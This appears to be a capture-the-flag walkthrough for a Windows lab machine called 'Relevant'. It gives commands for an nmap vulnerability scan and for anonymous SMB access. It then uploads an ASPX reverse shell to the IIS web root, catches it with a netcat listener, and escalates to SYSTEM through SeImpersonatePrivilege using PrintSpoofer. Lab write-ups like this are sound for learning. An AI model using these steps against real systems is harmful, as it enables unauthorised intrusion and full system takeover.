
## 2. Relevant

Run nmap scans and we found smb and other things

```
nmap -sC -sV -vv –script=vuln <IP>
```

We found another port 49663 running our Microsoft IIS

```
smbclient -L <IP>
```

```
smbclient \\\\<IP>\\nt4wrksv
```

```
ls
```

```
get passwords.txt
```

We found 2 hashes now decode it one by one

```
echo "<hash>" | base64 -d
```

##### These credentials wont work as they are placed to confuse us and waste our time

Now Microsoft IIS usually runs aspx

https://github.com/borjmz/aspx-reverse-shell

Click on raw and copy it to a file shell.aspx

Now change IP to tun0 IP

Go to http://IP:49663/nt4wrksv/passwords.txt

So, we are able to see our file

Now in smb login type

```
put shell.aspx
```

Run a netcat listener in your system

```
nc -lvnp 1234
```


Now go to this url

http://IP:49663/nt4wrksv/shell.aspx

And we got our reverse shell


```
dir C:\user.txt /s /b
```

```
cd C:\Users\Bob\Desktop
```

```
dir
```

```
type user.txt
```

##### We found user flag
  
```
whoami /priv
```

We found a vulnerability SeImpersonatePrivilege

https://github.com/k4sth4/PrintSpoofer

Now move file to home and

```
put PrintSpoofer.exe
```

```
cd C:\inetpub\wwwroot\nt4wrksv
```

```
PrintSpoofer.exe -i -c cmd
```

Now we are root

If we do whoami it shows nt authority\system

```
cd C:\Users\Administrator\Desktop
```

```
cat root.txt
```

